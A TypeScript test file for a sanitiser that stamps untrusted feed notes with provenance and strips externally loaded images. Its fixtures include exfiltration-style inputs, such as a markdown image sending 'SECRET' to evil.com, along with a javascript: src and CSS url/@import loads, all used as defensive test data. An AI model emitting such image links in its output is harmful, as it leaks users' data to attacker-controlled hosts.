import { describe, expect, test } from "vitest";
import { neutraliseExternalImages, secureFeedNote, stampProvenance } from "./secure-note.ts";

describe("stampProvenance", () => {
	test("a note without frontmatter gets one holding only the stamp", () => {
		expect(stampProvenance("# Talk\n\nBody")).toBe("---\nprovenance: feed-untrusted\n---\n# Talk\n\nBody");
		expect(stampProvenance("")).toBe("---\nprovenance: feed-untrusted\n---\n");
	});

	test("existing frontmatter keeps every key and its order; the stamp is added last", () => {
		const note = "---\ndate: 2026-10-12\ndescription: A talk\ntags:\n  - source\n---\n# Talk\n";
		expect(stampProvenance(note)).toBe("---\ndate: 2026-10-12\ndescription: A talk\ntags:\n  - source\nprovenance: feed-untrusted\n---\n# Talk\n");
	});

	test("a provenance the job wrote itself is overwritten, multi-line values included", () => {
		expect(stampProvenance("---\nprovenance: trusted\ndate: x\n---\nB")).toBe("---\nprovenance: feed-untrusted\ndate: x\n---\nB");
		expect(stampProvenance("---\nProvenance: \"mario\"\n---\nB")).toBe("---\nprovenance: feed-untrusted\n---\nB");
		expect(stampProvenance("---\nprovenance:\n  - mario\n  - trusted\ntags: [a]\n---\nB")).toBe("---\nprovenance: feed-untrusted\ntags: [a]\n---\nB");
		// Two of them: one stamp remains.
		expect(stampProvenance("---\nprovenance: a\nprovenance: b\n---\nB")).toBe("---\nprovenance: feed-untrusted\n---\nB");
	});

	test("a nested key of the same name is not the note's provenance", () => {
		expect(stampProvenance("---\nsource:\n  provenance: x\n---\nB")).toBe("---\nsource:\n  provenance: x\nprovenance: feed-untrusted\n---\nB");
	});

	test("CRLF notes stay CRLF; a byte order mark stays first; empty frontmatter works", () => {
		expect(stampProvenance("---\r\ndate: x\r\n---\r\nB\r\n")).toBe("---\r\ndate: x\r\nprovenance: feed-untrusted\r\n---\r\nB\r\n");
		const bom = String.fromCharCode(0xfeff);
		expect(stampProvenance(`${bom}---\ndate: x\n---\nB`)).toBe(`${bom}---\ndate: x\nprovenance: feed-untrusted\n---\nB`);
		expect(stampProvenance(`${bom}# B`)).toBe(`${bom}---\nprovenance: feed-untrusted\n---\n# B`);
		expect(stampProvenance("---\n---\nB")).toBe("---\nprovenance: feed-untrusted\n---\nB");
	});

	test("an unterminated block is not frontmatter: a real one goes in front", () => {
		expect(stampProvenance("---\nnot closed\nB")).toBe("---\nprovenance: feed-untrusted\n---\n---\nnot closed\nB");
	});

	test("stamping twice changes nothing more", () => {
		for (const note of ["# T", "---\ndate: x\n---\nB", "---\nprovenance: trusted\n---\nB", "---\r\na: 1\r\n---\r\n"]) {
			const once = stampProvenance(note);
			expect(stampProvenance(once), note).toBe(once);
		}
	});
});

describe("neutraliseExternalImages", () => {
	const n = neutraliseExternalImages;

	test("markdown images from the web become plain text naming the host", () => {
		expect(n("See ![chart](https://evil.com/x.png?d=SECRET) here")).toBe("See [image: evil.com] here");
		expect(n('![](http://evil.com/a.png "title")')).toBe("[image: evil.com]");
		expect(n("![a](<https://evil.com/a b.png>)")).toBe("[image: evil.com]");
		expect(n("![a](//evil.com/x.png)")).toBe("[image: evil.com]");
		expect(n("![a [b] c](https://evil.com/x.png)")).toBe("[image: evil.com]");
		expect(n("![a\\]b](https://evil.com/x.png)")).toBe("[image: evil.com]");
		expect(n("![a]( https://evil.com/x.png )")).toBe("[image: evil.com]");
		expect(n("![a](&#104;ttps://evil.com/x.png)")).toBe("[image: evil.com]");
	});

	test("reference-style images whose definition is on the web are neutralised", () => {
		const note = "Logo: ![alt][logo] and ![logo][] and ![Logo]\n\n[logo]: https://evil.com/x.png";
		expect(n(note)).toBe("Logo: [image: evil.com] and [image: evil.com] and [image: evil.com]\n\n[logo]: https://evil.com/x.png");
	});

	test("Obsidian embeds of web addresses are neutralised", () => {
		expect(n("![[https://evil.com/x.png]]")).toBe("[image: evil.com]");
		expect(n("![[https://evil.com/x.png|200]]")).toBe("[image: evil.com]");
	});

	test("HTML that loads from the web is neutralised, however it is spelled", () => {
		expect(n('<img src="https://evil.com/x.png">')).toBe("[image: evil.com]");
		expect(n("<IMG SRC=https://evil.com/x.png />")).toBe("[image: evil.com]");
		expect(n('<img alt="x"\n  srcset="https://evil.com/x.png 2x">')).toBe("[image: evil.com]");
		expect(n('<img src="&#x68;ttps://evil.com/x">')).toBe("[image: evil.com]");
		expect(n('<img src="//evil.com/x">')).toBe("[image: evil.com]");
		expect(n("<div style=\"background:url('https://evil.com/x')\">a</div>")).toBe("[image: evil.com]a</div>");
		expect(n('<iframe src="https://evil.com/frame"></iframe>')).toBe("[image: evil.com]</iframe>");
		expect(n('<video poster="https://evil.com/p.jpg"></video>')).toBe("[image: evil.com]</video>");
		expect(n('<img src="javascript:alert(1)">')).toBe("[image: external]");
		expect(n('<img alt="a>b" src="https://evil.com/x">')).toBe("[image: evil.com]");
		expect(n("![a](https\\://evil.com/x.png)")).toBe("[image: evil.com]");
		expect(n("<style>p { background: url(https://evil.com/x.png) }</style>ok")).toBe("[image: evil.com]ok");
		expect(n('<style>@import "https://evil.com/x.css";</style>')).toBe("[image: external]");
		expect(n("<style>p { color: red }</style>")).toBe("<style>p { color: red }</style>");
	});

	test("internal embeds, plain links and text are kept as they are", () => {
		for (const keep of [
			"![[Diagram.png]]",
			"![[Note#Heading]]",
			"![[Diagram.png|300]]",
			"![](attachments/x.png)",
			"![x](../img/a b.png)",
			"![x](<attachments/a b.png>)",
			'<img src="attachments/x.png">',
			"[a link](https://example.com/page)",
			"<https://example.com>",
			"Tom & Jerry ![x](pics/tom & jerry.png)",
			"No images here: ! [not](https://e.com) and !important",
			"![alt][local]\n\n[local]: attachments/x.png",
		]) {
			expect(n(keep), keep).toBe(keep);
		}
	});

	test("alt text nested at any depth still counts as an image", () => {
		expect(n("![a[b]](https://evil.com/x)")).toBe("[image: evil.com]");
		expect(n("![a[b[c]]](https://evil.com/x)")).toBe("[image: evil.com]");
		expect(n("x ![a[b[c[d]e]]f](https://evil.com/x) y")).toBe("x [image: evil.com] y");
		expect(n("![a\\[b[c]](https://evil.com/x)")).toBe("[image: evil.com]");
		expect(n("![a[b[c]]](<https://evil.com/a b> 'title')")).toBe("[image: evil.com]");
		expect(n("![a](https://evil.com/a_(b).png)")).toBe("[image: evil.com]");
		// Nested but internal: kept.
		expect(n("![a[b[c]]](pics/x.png)")).toBe("![a[b[c]]](pics/x.png)");
	});

	test("reference images with nested alt text, and definitions with angle brackets or titles", () => {
		expect(n("![a[b[c]]][r]\n\n[r]: https://evil.com/x")).toBe("[image: evil.com]\n\n[r]: https://evil.com/x");
		// A label holds brackets only escaped (CommonMark); the collapsed form uses the nested alt as its label.
		expect(n("![a\\[b\\]][]\n\n[a\\[b\\]]: https://evil.com/x")).toBe("[image: evil.com]\n\n[a\\[b\\]]: https://evil.com/x");
		expect(n('![x][r]\n\n[r]: <https://evil.com/a b> "Title"')).toBe('[image: evil.com]\n\n[r]: <https://evil.com/a b> "Title"');
		expect(n("![x][R]\n\n  [r]:\n  https://evil.com/x 'T'")).toBe("[image: evil.com]\n\n  [r]:\n  https://evil.com/x 'T'");
		expect(n("![a[b[c]]][r]\n\n[r]: pics/x.png")).toBe("![a[b[c]]][r]\n\n[r]: pics/x.png");
	});

	test("unclosed brackets are left alone, and a long run of them stays fast", () => {
		// The outer "![" never closes: an unresolved "![", so its paragraph loses every outside address.
		expect(n("![a[b](https://evil.com/x)")).toBe("![a[b](#external-removed-evil.com)");
		expect(n("![never closed")).toBe("![never closed");
		// 50 000 of each: a quadratic scan would take minutes; a linear one, milliseconds.
		for (const unit of ["![[", "![a](", "![a](<", "![a](b '", "<a ", '<a "', "<style>", "[x]: "]) {
			const flood = unit.repeat(50_000);
			const started = Date.now();
			expect(n(flood), unit).toBe(flood);
			expect(Date.now() - started, unit).toBeLessThan(1500);
		}
	});

	test("an image the scanner cannot pair (code span or HTML in the alt) neutralises its whole paragraph", () => {
		expect(n("![`[`](https://evil.com/x)")).toBe("![`[`](#external-removed-evil.com)");
		expect(n("![<b>[</b>](https://evil.com/x)")).toBe("![<b>[</b>](#external-removed-evil.com)");
		// Paired by the scanner as internal, but a code span in the alt could pair it differently.
		expect(n("![a`](pics/x.png)`](https://evil.com/x)")).toBe("![a`](pics/x.png)`](#external-removed-evil.com)");
		// Every outside address in that paragraph goes, plain links too; other paragraphs keep theirs.
		const note = "See [docs](https://example.com/page) here.\n\nOdd ![`[`](https://evil.com/x) and [l](https://e.com/a)\nsame paragraph [m](<https://e.com/b>)\n\nLater [ok](https://example.com/z).";
		expect(n(note)).toBe(
			"See [docs](https://example.com/page) here.\n\nOdd ![`[`](#external-removed-evil.com) and [l](#external-removed-e.com)\nsame paragraph [m](#external-removed-e.com)\n\nLater [ok](https://example.com/z).",
		);
	});

	test("reference definitions used by an unresolved image lose their outside address; others stay", () => {
		const note = "![`[`][r] and ![`[`][q]\n\n[r]: https://evil.com/x\n[Q]:\n  <https://evil.com/y> \"T\"\n[d]: https://example.com\n\nA [plain][d] link.";
		expect(n(note)).toBe(
			"![`[`][r] and ![`[`][q]\n\n[r]: #external-removed-evil.com\n[Q]:\n  #external-removed-evil.com \"T\"\n[d]: https://example.com\n\nA [plain][d] link.",
		);
	});

	test("clean paragraphs are left alone: internal images, wiki embeds, inline code and links together", () => {
		for (const keep of [
			"![a](pics/x.png) and `code` and [l](https://e.com)",
			"![[Diagram.png]] see [l](https://e.com)",
			"![alt][local] and [l](https://e.com)\n\n[local]: attachments/x.png",
		]) {
			expect(n(keep), keep).toBe(keep);
		}
	});

	test("fenced code is never rewritten by the paragraph fallback", () => {
		const fenced = "```md\n![`[`](https://evil.com/x) and [l](https://e.com)\n```\n\nText [l](https://e.com).";
		expect(n(fenced)).toBe(fenced);
		const tilde = "~~~\n![<b>[</b>](https://evil.com/x)\n~~~";
		expect(n(tilde)).toBe(tilde);
		// Not a fence (backtick in the info string), so the image paragraph is judged.
		expect(n("```x`\n![`[`](https://evil.com/x)")).toBe("```x`\n![`[`](#external-removed-evil.com)");
		// A fence after an HTML block start is not trusted: CommonMark may still render what follows.
		const html = "<pre>\n\n```\n</pre>\n\n![`[`](https://evil.com/x)\n\n```";
		expect(n(html)).toBe("<pre>\n\n```\n</pre>\n\n![`[`](#external-removed-evil.com)\n\n```");
	});

	test("the paragraph fallback is idempotent", () => {
		for (const note of ["![`[`](https://evil.com/x) [l](https://e.com)", "![`[`][r]\n\n[r]: https://evil.com/x"]) {
			expect(n(n(note)), note).toBe(n(note));
		}
	});

	test("an outside target too long to read to its end still loses its image", () => {
		const long = `![a](https://evil.com/${"x".repeat(10_000)})`;
		expect(n(long).startsWith("[image: evil.com]")).toBe(true);
		expect(n(long)).not.toContain("![");
		const tag = `<img alt="${"y".repeat(70_000)}" src="https://evil.com/x">`;
		expect(n(tag).startsWith("&lt;img")).toBe(true);
	});

	test("CSS image-set and -webkit-image-set are neutralised like url()", () => {
		expect(n('<div style="background-image: image-set(\'https://evil.com/x.png\' 1x)">a</div>')).toBe("[image: evil.com]a</div>");
		expect(n('<div style=\'background: -webkit-image-set("https://evil.com/x.png" 2x)\'>a</div>')).toBe("[image: evil.com]a</div>");
		expect(n('<style>p { background: image-set("//evil.com/x.png" 1x) }</style>')).toBe("[image: evil.com]");
		expect(n('<div style="background: image-set(\'pics/x.png\' 1x)">a</div>')).toBe('<div style="background: image-set(\'pics/x.png\' 1x)">a</div>');
	});

	test("running it twice changes nothing more", () => {
		const note = "![a](https://evil.com/x.png) ![[https://e.com/y.png]] <img src=https://e.com/z>";
		expect(n(n(note))).toBe(n(note));
	});
});

describe("secureFeedNote", () => {
	test("stamps and neutralises in one pass", () => {
		expect(secureFeedNote("---\ndate: x\n---\n![a](https://evil.com/x.png)")).toBe("---\ndate: x\nprovenance: feed-untrusted\n---\n[image: evil.com]");
	});
});
